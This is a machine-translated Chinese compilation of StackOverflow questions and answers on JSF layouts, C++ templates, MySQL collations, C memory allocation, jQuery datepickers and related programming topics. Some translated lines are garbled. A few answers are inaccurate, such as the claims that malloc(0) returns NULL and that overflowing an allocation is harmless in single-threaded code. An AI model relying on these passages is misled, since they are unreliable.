# StackOverflow 问答 15738000-15738999

# jsf - JSF Primefaces 在布局问题中使用菜单栏

> ID：15738001
> 
> 赞同：8
> 
> 时间：2013-04-01T05:18:28.697
> 
> 标签：jsf, layout, primefaces, menubar

我的 JSF 页面使用 Layout 时出现问题。我试图将我的菜单栏定位在北定位布局单元的标题部分。它正确定位菜单栏。但我需要向上或向下滚动布局单元才能单击菜单项。有没有其他方法可以实现这一目标？使用素面

我的树节点也永远不可见。（查看注释代码）

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">

<html xmlns="http://www.w3.org/1999/xhtml"
  xmlns:h="http://java.sun.com/jsf/html"
  xmlns:f="http://java.sun.com/jsf/core"
  xmlns:ui="http://java.sun.com/jsf/facelets"
  xmlns:p="http://primefaces.org/ui">

<f:view contentType="text/html">
    <h:head>
        <f:facet name="first">
            <meta content='text/html; charset=UTF-8' http-equiv="Content-Type"/>
            <title>Committee and Meetings Management</title>
        </f:facet>
    </h:head>

    <h:body>

        <p:layout fullPage="true">

            <p:layoutUnit position="north" size="100" resizable="true" closable="false" collapsible="true">

                <h:form> 
            <p:menubar id="menubar">
                <p:submenu label="Committee" >
                    <p:menuitem value="Compose" url="#"/>
                    <p:menuitem value="Create" url="#"/>
                    <p:menuitem value="Modify" url="#"/>
                    <p:menuitem value="Search" url="#"/>
                    <p:menuitem value="Delete" url="#"/>
                </p:submenu> 

                <p:submenu label="Logout" />

            </p:menubar>
        </h:form>
            </p:layoutUnit>

            <p:layoutUnit position="south" size="100" closable="true" collapsible="true">
                <h:panelGrid id="bottom">
                    <h:outputText value="Best viewed with Google Chrome and Internet Explorer Version 6 or above"/>
                    <h:outputText value="Copyright © 2007 Newgen Software Technologies Limited. All rights reserved." />
                </h:panelGrid>
            </p:layoutUnit>

            <p:layoutUnit position="west" size="175" header="Left" collapsible="true">
                <!--<h:form id="form">
                    <p:tree value="#{treeBean.root}" var="node" id="tree">
                        <p:treeNode id="treeNode">
                            <h:outputText value="#{node}" id="lblNode"/>
                        </p:treeNode>
                    </p:tree>
                </h:form> -->
            </p:layoutUnit>

            <p:layoutUnit position="center">
                Welcome #{login.userName}
            </p:layoutUnit>

        </p:layout>

    </h:body>

</f:view> 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-04-11T18:24:48.790

你只需要覆盖默认的 CSS 布局：

```
 .ui-layout-north {
        z-index:20 !important;
        overflow:visible !important;
    }

    .ui-layout-north .ui-layout-unit-content {
        overflow:visible !important;
    } 
```

# c++ - 函数模板重载

> ID：15738003
> 
> 赞同：1
> 
> 时间：2013-04-01T05:18:38.093
> 
> 标签：c++

考虑以下程序。

```
#include <iostream>
using namespace std;

int sum (int & a, int & b)
{
  cout <<" NOn template function "<<endl;
  return a+b;
}

template <typename T>
int sum ( const T & a, const T & b)
{
  cout<<"Template Generated .."<<endl;
  return a+b;
};

int main(int argc, char ** argv)
{
  cout <<sum(10,20)<<endl;;
} 
```

**问题是什么：**

我期待调用非模板函数的 sum() 。但是在我的输出模板中调用了初始化函数。它不是函数模板重载的一部分吗？

请指出我在这里犯了什么错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T05:20:28.073

> 我期待调用非模板函数的 sum() 。

您正在传递右值，它不能绑定到非常量引用。因此选择了模板版本。

更改`int &`为`int const &`OR `int`，将选择第一个版本：

*   [http://ideone.com/yKAFLP](http://ideone.com/yKAFLP)使用`int const&`.
*   [http://ideone.com/nlP27g](http://ideone.com/nlP27g)使用`int`.

希望有帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-01T05:20:28.347

问题是`int&`不能绑定到临时的，所以不能使用非模板版本。这与`int& i = 10;`不允许的行为相同。

`10`并且`20`是纯右值（3.10）：

> prvalue（“纯”右值）是不是 xvalue 的右值。[ 示例：调用返回类型不是引用的函数的结果是纯右值。**诸如 12、7.3e5 或 true 之类的文字的值也是纯右值。**—结束示例]

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:22:41.047

```
template <typename T>
T sum ( const T & a, const T & b)
{
  cout<<"Template Generated .."<<endl;
  return a+b;
}; 
```

**更改** 为`sum ( const T & a, const T & b)` _`int``T`

# sorting - 最佳双调排序算法

> ID：15738008
> 
> 赞同：2
> 
> 时间：2013-04-01T05:19:16.593
> 
> 标签：sorting

我正在研究双音排序算法，

我意识到这个算法似乎有两种形式：

维基百科算法 [http://en.wikipedia.org/wiki/Bitonic_sorter](http://en.wikipedia.org/wiki/Bitonic_sorter)

替代算法 [http://www.cs.rutgers.edu/~venugopa/parallel_summer2012/bitonic_overview.html](http://www.cs.rutgers.edu/~venugopa/parallel_summer2012/bitonic_overview.html) （也是 CUDA 示例库中使用的算法）

维基百科算法：

```
1 2 3 4

d c b a // start

c d a b // compare (1, 2) (3, 4)

b a d c // compare (1, 4) (2, 3)

a b c d // compare (1, 2) (3, 4) 
```

替代算法：

```
1 2 3 4

d c b a // start

c d a b // compare (1, 2) (3, 4)

a b c d // compare (1, 3) (2, 4) 
```

在这个简单的例子中，替代算法似乎更有效

这两种算法是否等效？

第一个有什么优势吗？

# mysql - 使唯一键不区分大小写

> ID：15738013
> 
> 赞同：5
> 
> 时间：2013-04-01T05:20:01.900
> 
> 标签：mysql, sql, database-design

这是我的 mysql 表架构，我使用的是 mysql 5

```
--
-- Table structure for table `DATA_USER_ROLE`
--

DROP TABLE IF EXISTS `DATA_USER_ROLE`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `DATA_USER_ROLE` (
  `ID` int(11) NOT NULL,
  `NAME` varchar(128) NOT NULL,
  `VAL_ID` int(11) NOT NULL,
  `CREATION_TIME` datetime NOT NULL,
  `ROLE_TYPE` int(11) NOT NULL,
  `STORAGE_TYPE` int(11) NOT NULL,
  PRIMARY KEY (`ID`),
  UNIQUE KEY `BV_AC_ROLE_KEY_IDX` (`NAME`,`VAL_ID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8; 
```

需要 UNIQUE KEY 大小写敏感，

它应该允许输入像('a',0) & ('A', 0) 这样的值

尝试将排序规则更改为 latin_1 和 latin_generic_ci

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T05:22:07.467

`BINARY`最简单的就是在 DDL 语句上添加，

```
`NAME` varchar(128) BINARY NOT NULL 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/b93e5)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-04-29T17:48:52.550

可以在整个表格上添加不区分大小写`COLLATE`，即表格中的每个文本列，例如

```
CREATE TABLE `DATA_USER_ROLE` (
  `ID` int(11) NOT NULL,
  `NAME` varchar(128) NOT NULL,
  `VAL_ID` int(11) NOT NULL,
  `CREATION_TIME` datetime NOT NULL,
  `ROLE_TYPE` int(11) NOT NULL,
  `STORAGE_TYPE` int(11) NOT NULL,
  PRIMARY KEY (`ID`),
  UNIQUE KEY `BV_AC_ROLE_KEY_IDX` (`NAME`,`VAL_ID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; 
```

在这种情况下，`_ci`末尾的`COLLATE`代表`case insensitive`。

这遵循 Monolune 对 CHARSET 和 COLLATE 的建议，来自[https://www.monolune.com/mysql-utf8-charsets-and-collat](https://www.monolune.com/mysql-utf8-charsets-and-collations-explained/) ​​ions-explained/和
[https://www.monolune.com/what-is-the-utf8mb4_0900_ai_ci-整理/](https://www.monolune.com/what-is-the-utf8mb4_0900_ai_ci-collation/)

这些是自 MySQL 8.0.1 以来的默认值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:34:25.913

如果您需要区分大小写：

```
ALTER TABLE `DATA_USER_ROLE` CHANGE `NAME` `NAME` VARCHAR( 128 )
CHARACTER SET latin1 COLLATE latin1_bin NULL DEFAULT NULL 
```

如果您需要不区分大小写：

```
ALTER TABLE `DATA_USER_ROLE` CHANGE `NAME` `NAME` VARCHAR( 128 )
CHARACTER SET latin1 COLLATE latin1_general_ci NULL DEFAULT NULL 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-28T08:48:33.227

你可以这样做..

```
create table testTable (col_name varchar(100) character set utf8 
collate utf8_bin not null ) Engine=innodb default charset=utf8 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2015-10-16T08:09:13.060

默认情况下，只需为您的数据库使用 utf8_general_ci （不区分大小写）字符集或仅用于一行，如果您需要

# c - 如果我使用错误大小的 malloc 会发生什么？

> ID：15738016
> 
> 赞同：2
> 
> 时间：2013-04-01T05:20:17.530
> 
> 标签：c, malloc

我正在尝试了解有关内存分配的更多信息，因此我在下面编写了一些测试代码，以查看如果我尝试分配比我需要的更小的内存会发生什么。

```
#include <stdlib.h>
#include <stdio.h>

typedef struct {
    char *message;
    int number;
} Object;

int main(int argc, char *argv[]) {
    Object *obj = malloc(sizeof(Object) - 8);   
    printf("The size of the struct is: %ld\n", sizeof(Object));
    printf("The size of what was allocated is: %ld\n", sizeof(*obj));

    obj->message = "Hello there! My name is Chris!";
    obj->number = 435543;

    puts(obj->message);
    printf("%d\n", obj->number);

    free(obj);

    return 0;
} 
```

首先， sizeof(*obj) 是查看在这种情况下实际分配了多少内存的正确方法吗？其次，为什么即使我没有分配足够的空间，我仍然可以为结构对象赋值？

我的操作系统是 Ubuntu 12.10 64bit，编译器是 gcc 4.7.2

这是 valgrind 的输出：

```
==14257== Memcheck, a memory error detector
==14257== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==14257== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==14257== Command: ./ex
==14257== 
The size of the struct is: 16
The size of what was allocated is: 16
==14257== Invalid write of size 4
==14257==    at 0x400640: main (ex.c:15)
==14257==  Address 0x51f1048 is 0 bytes after a block of size 8 alloc'd
==14257==    at 0x4C2B3F8: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==14257==    by 0x400604: main (ex.c:10)
==14257== 
Hello there! My name is Chris!
==14257== Invalid read of size 4
==14257==    at 0x40065A: main (ex.c:18)
==14257==  Address 0x51f1048 is 0 bytes after a block of size 8 alloc'd
==14257==    at 0x4C2B3F8: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==14257==    by 0x400604: main (ex.c:10)
==14257== 
435543
==14257== 
==14257== HEAP SUMMARY:
==14257==     in use at exit: 0 bytes in 0 blocks
==14257==   total heap usage: 1 allocs, 1 frees, 8 bytes allocated
==14257== 
==14257== All heap blocks were freed -- no leaks are possible
==14257== 
==14257== For counts of detected and suppressed errors, rerun with: -v
==14257== ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 2 from 2) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T05:32:25.017

在这种特定情况下，您可能会尝试分配 0 字节，因为`sizeof(Object)`在大多数 32 位编译器中是 8。`malloc(0)`将返回`NULL`为其分配的无效大小，并且尝试写入地址`NULL`肯定会使您的应用程序崩溃。

但是假设您成功分配了 4 个字节，并尝试在其中写入 8 个字节。在单线程应用程序中，它应该可以毫无问题地工作，因为尽管您将写入未分配的内存空间，但它不会完全写入虚拟内存中丢失的某个疯狂地址。

但是，如果您这样做：

```
Object* a = (Object*)malloc(4);
Object* b = (Object*)malloc(4); 
```

这可能是真的，`a`并且`b`是在意甲中分配的。这意味着，在大多数 32 位编译器中，写入`a->number`将`b->message`用相同的值覆盖，反之亦然，因为两者都将尝试将信息存储到内存中的相同空间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T05:24:59.723

你做这种探索很好。大多数标准 c 库都包含非标准扩展，允许您在分配内存后检查内存大小。如果您想了解有关如何实现的更多信息，您应该在从 malloc 返回后调用它并查看标准库实际分配了多少内存`malloc`。你可能会发现一些简单的东西`malloc(1)`可以返回一个相当大的内存块。

正如其他一些读者指出的那样，`malloc`如果您要在 32 位系统上重新编译，您可能会要求在示例代码中分配零字节。它会很高兴地服从并返回`NULL`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T05:22:35.380

这取决于编译器和操作系统。在许多情况下，它最终会崩溃。绝对不推荐。也可能导致缓冲区溢出。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-08-03T17:59:18.160

要回答有关 sizeof 的子问题： sizeof 根据您使用的类型产生结果（在 C 中，可变长度数组有单独的情况）。如果你写

```
T* obj = malloc (any value); 
```

然后 sizeof (*obj) 只查看 *obj 的类型，即 T，并产生 T 类型的对象的大小。分配是否失败并且 obj 实际上为 NULL，或者您分配的是否更少并不重要或者比 T 的大小更多的字节，如果你根本没有调用 malloc 并且 obj 是一个未初始化的变量，这甚至都没有关系。

# windows - 从 Windows 访问 Hadoop 云服务

> ID：15738020
> 
> 赞同：2
> 
> 时间：2013-04-01T05:20:30.957
> 
> 标签：windows, hadoop, mapreduce, cloud

我是hadoop的新手。我正在使用yahoo 提供的[已经配置过 hadoop](http://developer.yahoo.com/hadoop/tutorial/module3.html)的 VM，因为我不允许在我的机器上安装 Linux 操作系统。我需要利用云服务，并且必须从事与 hadoop 相关的项目。

[Microsoft Insight](https://www.windowsazure.com/en-us/pricing/free-trial/?WT.mc_id=AzureBG_US_Display_Q3_GrSP_NETV1C)几天前就提供了这些服务。但现在它已成为付费的。此外，我正在用 Java 开发 MapReduce 程序。

当我在谷歌搜索“Hadoop & Cloud”时，大部分时间我都会得到[CLoudera 的云产品](http://www.cloudera.com/content/cloudera/en/why-cloudera/hadoop-and-big-data.html)。

但是要访问它，他们要求[安装一个名为“Whirr”](https://ccp.cloudera.com/display/CDH4DOC/Whirr+Installation)的东西，因为我只在基于 Windows 的平台上工作，所以我无法解决。

我还检查了[Joynet](http://joyent.com/products/joyent-cloud/features/hadoop)。但它也是付费的。

我认为云访问就像连接云与来自 MSTSC 的 IP。但事实并非如此。我需要在 Windows 上玩 hadoop over cloud。我该怎么做？。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T22:32:00.033

我认为您通常对云以及云中的 Hadoop 有误解。在云场景中，应用程序或基础设施都远程位于云供应商位置，并在需要时使用远程访问/管理/配置它们。

所以如果你想访问云中的Hadoop，Hadoop集群必须先位于云中，然后你才能访问它。您需要花费几美元才能在云上安装 Hadoop。您可以使用[HDInsight（Windows Azure 上的 Hadoop）](http://www.windowsazure.com/en-us/manage/services/hdinsight/) 或基于[Amazon EMR](http://aws.amazon.com/elasticmapreduce/)云的 Hadoop 服务。使用这些云服务，您将拥有已经构建好的 Hadoop 集群并准备好推送数据并应用您的工作。

# asp.net - 按钮单击事件未在用户控件的第二次单击时触发

> ID：15738022
> 
> 赞同：1
> 
> 时间：2013-04-01T05:20:44.577
> 
> 标签：asp.net, user-controls

大家好，我已经创建了一个用户控件，在每个按钮单击上我将有大约 3 个按钮，我将根据按钮单击动态分配一个网格，其中的值很少。一切正常，但是当我从 gridview 中删除一行并再次执行按钮单击事件时，它不会触发按钮单击事件

我的代码在`User control`

```
DataTable dt= new DataTable();
protected void Page_Load(object sender, EventArgs e)
{
  if (ViewState["CurrentTable"] == null)
  {
     dt.Columns.Add("Id", typeof(string));
     dt.Columns.Add("xx", typeof(string));
     dt.Columns.Add("xx", typeof(string));
     dt.Columns.Add("xx", typeof(string));
     dt.Columns.Add("xx", typeof(string));
  }
   }

protected void btn1_Click(object sender, EventArgs e)
{
  if (ViewState["CurrentTable"] == null)
  {
  }
  else
  {
      addrow("Some", txt1.Text);
  } 
}

protected void grd_Deleting(object sender, DevExpress.Web.Data.ASPxDataDeletingEventArgs e)
{
       int iIndex;
        iIndex = grd.FocusedRowIndex;
        dt.Rows[iIndex].Delete();
        grd.DataSource = dt;
        grd.DataBind();
} 
```

删除一行后如何执行按钮单击操作以再次触发

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:42:48.227

我认为问题出在`grd_Deleting`

我看不到你在哪里设置新值（删除后）`view-state`。

```
protected void grd_Deleting(object sender, DevExpress.Web.Data.ASPxDataDeletingEventArgs e)
{
   int iIndex;
    iIndex = grd.FocusedRowIndex;
    dt.Rows[iIndex].Delete();
    //set dt to view state
    ViewState["CurrentTable"] =dt;
    grd.DataSource = dt;
    grd.DataBind();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:46:34.673

删除后使用此代码

```
ViewState["CurrentTable"] = dt // OR Null base on your requirement
btn1_Click(null, null); 
```

还有一件事 当最终用户单击 Delete 命令或调用 DeleteRow 方法时，会发生 RowDeleting 事件。要取消删除操作，请将事件参数的 Cancel 属性设置为 true。

```
e.cancel=true; //in finally 
```

见[参考](http://documentation.devexpress.com/#AspNet/DevExpressWebASPxGridViewASPxGridView_RowDeletingtopic)

# jquery - 开始和结束日期验证有问题

> ID：15738024
> 
> 赞同：1
> 
> 时间：2013-04-01T05:21:11.217
> 
> 标签：jquery, datepicker

这是我的代码..

```
<html>
  <script src='jquery-1.3.2.min.js' type='text/javascript'></script>
  <script src='jquery-ui-1.7.3.min.js' type='text/javascript'></script>
  <script src='jquery-ui-1.7.3.custom.min.js' type='text/javascript'></script>

<script type="text/javascript">
$(document).ready(function(){
    $("#startDate").datepicker({
        changeMonth: true,
        changeYear: true,
        onSelect: function(selected) { 
          $("#endDate").datepicker("option","minDate", selected)
        }
    });
    $("#endDate").datepicker({
        changeMonth: true,
        changeYear: true,
        onSelect: function(selected) { 
          $("#startDate").datepicker("option","minDate", selected)
        }
    });
});
</script>

<input type='text' name='startDate' id='startDate' />
<input type='text' name='endDate' id='endDate' />

</html> 
```

一旦我选择起始数据为 04/11/2013，endDate 日期选择器允许选择大于“10/20/2018”的日期，我的意思是 2018 年 10 月 20 日。我不确定是什么问题。我什至试图用一些静态日期替换选定的日期，但我没有帮助我。

请帮助我。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:30:07.377

您可以使用以下代码。

```
$('#startDate').removeClass('hasDatepicker').datepicker(
{
    dateFormat: 'yy-mm-dd',
    changeMonth: true,
    changeYear: true,
    onSelect: ChangeEndDate
});

function ChangeEndDate()
{
    var d = $("#startDate").datepicker('getDate');
    $('#endDate').removeClass('hasDatepicker').datepicker(
    {
        minDate: d,
        dateFormat: 'yy-mm-dd',
        changeMonth: true,
        changeYear: true,
        onSelect: firstOfNextMonth
    });
} 
```

# c - char *[] 和 char (*)[] 的区别

> ID：15738026
> 
> 赞同：3
> 
> 时间：2013-04-01T05:21:15.000
> 
> 标签：c, arrays, pointers, char

和有什么区别

`char *array[10];`

和

`char (*array)[10];`?

据我了解，

*   **情况1：**
    *   `array`被声明为大小为 10 的字符数组。
    *   这是因为`[]`优先级高于`*`。
*   **案例二：**
    *   `array`被声明为指向大小为 10 的字符数组的指针。
    *   这是因为`()`和`[]`具有相同的优先级，并且它们是从左到右进行评估的。然后对`*`运算符进行评估。

我的理解正确吗？即使它是正确的，我也会感到非常困惑。有人可以更清楚地解释一下区别吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-01T05:44:23.170

当试图解释 C 的类型时，将 [...]（或 [...][...]... 组）与事物的左侧切换，然后从右向左阅读。因此

```
char *array[10] -> char *[10]array = 
```

"`array`是一个包含 10 个指向 char 的指针的数组"

和

```
char (*array)[10] -> char [10](*array) 
```

“`array`是指向 10 个字符的数组的指针”

所以在第一种情况下，`array`是 10 个连续的指针，每个指针都指向一个 char（可能是单个 char，或一系列字符，如字符串），而在第二种情况下，`array`是单个指针，指向一个10 个连续字符的数组。

您可以对函数类型执行类似的操作，将参数列表与左侧的事物进行切换。例如，

```
char* (*f[10])(int*) -> char* (int*)(*[10]f) 
```

“`f`是一个包含 10 个函数的指针的数组，这些函数接受一个指向 int 参数的指针并返回一个指向 char 的指针”。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-01T05:31:15.503

第一个可能更好地称为字符指针数组。

通过识别一种技巧可以使阅读复杂的指针定义变得更容易。我读[了这篇文章](http://ieng9.ucsd.edu/~cs30x/rt_lt.rule.html)，它帮助了我很多。还有[一个](http://unixwiz.net/techtips/reading-cdecl.html)看起来也不错。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T05:29:49.047

在第一种情况下`array`，是一个包含 10 个指向 char 的指针的数组，如果它不是函数参数，如`void some_function(char* array[10])`. 如果它是一个函数参数，那么它是一个指向 char 指针的指针。

~~在第二种情况下，您的声明无效。[请参阅此处](http://ideone.com/0z87iT)的编译错误。~~

在第二种情况下`array`是一个指向 10 个字符的数组的指针。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-01T05:30:47.697

**字符*数组[10]；**是一个由 10 个字符指针组成的数组。

例子：

```
char *array[10] = {"Hello", "Hai"}; 
```

其中**char (*array)[10];** 是一个指向 10 个字符的数组的指针。

第二个可以指向**char arr[10];**

例子

**数组 = &arr;**

[指向数组/指针数组的C指针消歧](https://stackoverflow.com/questions/859634/c-pointer-to-array-array-of-pointers-disambiguation)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-01T08:39:37.417

检查 Deep C Secrets 中的“Unscrambling C 声明”部分或 K&R 中的“复杂声明”...

# c - 如何使用 FILE 作为 C 中函数的参数？

> ID：15738029
> 
> 赞同：6
> 
> 时间：2013-04-01T05:21:25.520
> 
> 标签：c, file, function, unix

我正在学习 C，我来自 Java 背景。如果我能得到一些指导，我将不胜感激。这是我的代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    char *str = "test text\n";
    FILE *fp;

    fp = fopen("test.txt", "a");
    write(fp, str);
}

void write(FILE *fp, char *str)
{
    fprintf(fp, "%s", str);
} 
```

当我尝试编译时，我收到此错误：

```
xxxx.c: In function ‘main’:
xxxx.c:18: warning: passing argument 1 of ‘write’ makes integer from pointer without a cast
/usr/include/unistd.h:363: note: expected ‘int’ but argument is of type ‘struct FILE *’
xxxx.c:18: error: too few arguments to function ‘write’
xxxx.c: At top level:
xxxx.c:21: error: conflicting types for ‘write’
/usr/include/unistd.h:363: note: previous declaration of ‘write’ was here 
```

有什么想法吗？谢谢你的时间。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-01T05:25:26.187

您缺少函数的函数原型。此外，`write`被声明，`unistd.h`这就是你得到第一个错误的原因。尝试将其重命名为`my_write`或其他内容。您实际上`stdio.h`也只需要该库作为附注，除非您计划稍后使用其他功能。我添加了错误检查`fopen`以及`return 0;`应该结束 C 中的每个主要函数。

这是我要做的：

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void my_write(FILE *fp, char *str)
{
    fprintf(fp, "%s", str);
}

int main(void)
{
    char *str = "test text\n";
    FILE *fp;

    fp = fopen("test.txt", "a");
    if (fp == NULL)
    {
        printf("Couldn't open file\n");
        return 1;
    }
    my_write(fp, str);

    fclose(fp);

    return 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:25:14.350

`man 2 write`在 linux 上查看。

```
#include <unistd.h>

     ssize_t write(int fd, const void *buf, size_t count); 
```

那就是原型。您需要传递一个整数文件描述符而不是文件指针。如果你想要你自己的函数把名字`foo_write`改成什么的

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:25:36.963

已经有一个名为`write`. 只需将您的函数命名为其他名称，在使用之前添加一个函数声明，就可以了。

# spring - 如何将 spring ModelAndView 对象属性注入 Angular 模块？

> ID：15738032
> 
> 赞同：2
> 
> 时间：2013-04-01T05:21:29.617
> 
> 标签：spring, angularjs, code-injection, modelandview

我的应用程序使用带有 apache 速度的 SpringMVC。现在我要将 Angularjs 控制器添加到 *.vm 文件（速度文件）中。我在访问 Spring 控制器返回的 ModelAndView 对象中设置的对象时发现了一个问题。

有人可以给我一个简单的例子来说明如何做同样的事情吗？

示例： **Controller.java**

```
ModelAndView mav = ControllerUtil.createModelView();
String dataSource = Constant.DATA_SOURCE;
HttpSession session = (HttpSession) mav.getModel().get("httpSession");  
**mav.addObject("dataSource", dataSource);** 
```

**请举例说明如何在 AngularJS 模块中获取“dataSource”值。**

提前致谢，DBKnot 团队

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T07:15:59.037

我不熟悉速度，但我也试图找到一种方法来完成你似乎想要做的事情。

我目前正在探索（也测试过）这种方法。使用[Jackson](http://jackson.codehaus.org/)将您的对象解析为字符串。这可以在控制器上或通过自定义标记在 JSP 中完成。

例子：

```
 ObjectMapper jsonMapper = new ObjectMapper();
    String result = null;
    try {
        result =  jsonMapper.writeValueAsString(obj);
    } catch (Exception e) {
        // Handle it
    }
    **mav.addObject("dataSource", result);** 
```

在 HTML/JSP/Whatever 上有类似的东西

```
<div ng-controller="MyCtrl" ng-init="init(${dataSource})">...</div> 
```

并让您的控制器的 init 方法处理其余部分。

**笔记**

与往常一样，您应该阅读文档，**AngularJS 建议**应该通过 AJAX 请求初始化模型，而不是从 DOM 中获取（这就是这里发生的情况）。

我很想看到这个的替代品

# java - 如何将 4 位浮点数转换为 2 位浮点数

> ID：15738033
> 
> 赞同：-1
> 
> 时间：2013-04-01T05:21:37.583
> 
> 标签：java, floating-point

请告诉我将浮点数的双变量值转换为仅 2 个浮点的代码？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T06:41:07.470

如果您的意思是，例如，将 10.1234 变为 10.12，则尝试对此进行试验：

```
import java.text.DecimalFormat;

...

DecimalFormat df = new DecimalFormat("#.##");
double num = 10.1234;
double newNum = Double.parseDouble(df.format(num));
System.out.println(newNum); 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2013-04-01T05:23:21.783

使用 Math.round -[文档](http://docs.oracle.com/javase/6/docs/api/java/lang/Math.html)

# ruby-on-rails - Heroku - 页面不存在

> ID：15738040
> 
> 赞同：1
> 
> 时间：2013-04-01T05:22:14.840
> 
> 标签：ruby-on-rails, ruby-on-rails-3, heroku

尝试访问我的应用程序时出现我的页面不存在的错误。它可以在本地工作，但不能在系统上工作，我已经运行了 rake 和 routes 并重新启动，但没有解决。“页面不存在”确实显示了我的自定义图标。这是一个简单的一页应用程序，可在我拥有的个人公司内使用，非常基本，没有任何东西，一套脚手架，仅此而已.... 是在 RubyMine 中开发的

路线文件：

```
BoothLeads::Application.routes.draw do

  resources :leads

  # The priority is based upon order of creation:
  # first created -> highest priority.

  # Sample of regular route:
  #   match 'products/:id' => 'catalog#view'
  # Keep in mind you can assign values other than :controller and :action

  # Sample of named route:
  #   match 'products/:id/purchase' => 'catalog#purchase', :as => :purchase
  # This route can be invoked with purchase_url(:id => product.id)

  # Sample resource route (maps HTTP verbs to controller actions automatically):
  #   resources :products

  # Sample resource route with options:
  #   resources :products do
  #     member do
  #       get 'short'
  #       post 'toggle'
  #     end
  #
  #     collection do
  #       get 'sold'
  #     end
  #   end

  # Sample resource route with sub-resources:
  #   resources :products do
  #     resources :comments, :sales
  #     resource :seller
  #   end

  # Sample resource route with more complex sub-resources
  #   resources :products do
  #     resources :comments
  #     resources :sales do
  #       get 'recent', :on => :collection
  #     end
  #   end

  # Sample resource route within a namespace:
  #   namespace :admin do
  #     # Directs /admin/products/* to Admin::ProductsController
  #     # (app/controllers/admin/products_controller.rb)
  #     resources :products
  #   end

  # You can have the root of your site routed with "root"
  # just remember to delete public/index.html.
   #root :to => 'leads#index.html'

  # See how all your routes lay out with "rake routes"

  # This is a legacy wild controller route that's not recommended for RESTful applications.
  # Note: This route will make all actions in every controller accessible via GET requests.
  # match ':controller(/:action(/:id))(.:format)'
end 
```

迁移

```
class CreateLeads < ActiveRecord::Migration
  def change
    create_table :leads do |t|
      t.string :name
      t.string :address
      t.string :phone
      t.text :interest

      t.timestamps
    end
  end
end 
```

引线控制器

```
class LeadsController < ApplicationController
  # GET /leads
  # GET /leads.json
  def index
    @leads = Lead.all

    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @leads }
    end
  end

  # GET /leads/1
  # GET /leads/1.json
  def show
    @lead = Lead.find(params[:id])

    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @lead }
    end
  end

  # GET /leads/new
  # GET /leads/new.json
  def new
    @lead = Lead.new

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @lead }
    end
  end

  # GET /leads/1/edit
  def edit
    @lead = Lead.find(params[:id])
  end

  # POST /leads
  # POST /leads.json
  def create
    @lead = Lead.new(params[:lead])

    respond_to do |format|
      if @lead.save
        format.html { redirect_to @lead, notice: 'Lead was successfully created.' }
        format.json { render json: @lead, status: :created, location: @lead }
      else
        format.html { render action: "new" }
        format.json { render json: @lead.errors, status: :unprocessable_entity }
      end
    end
  end

  # PUT /leads/1
  # PUT /leads/1.json
  def update
    @lead = Lead.find(params[:id])

    respond_to do |format|
      if @lead.update_attributes(params[:lead])
        format.html { redirect_to @lead, notice: 'Lead was successfully updated.' }
        format.json { head :no_content }
      else
        format.html { render action: "edit" }
        format.json { render json: @lead.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /leads/1
  # DELETE /leads/1.json
  def destroy
    @lead = Lead.find(params[:id])
    @lead.destroy

    respond_to do |format|
      format.html { redirect_to leads_url }
      format.json { head :no_content }
    end
  end
end 
```

还有什么需要告诉我的。

谢谢您的帮助。

CMD 提示：Heroku 日志

```
C:\Users\Jeff Gray\RubymineProjects\BoothLeads>heroku logs
2013-04-01T05:34:12+00:00 app[web.1]: Completed 200 OK in 218ms (Views: 61.9ms |
 ActiveRecord: 63.6ms)
2013-04-01T05:34:13+00:00 heroku[router]: at=info method=GET path=/assets/applic
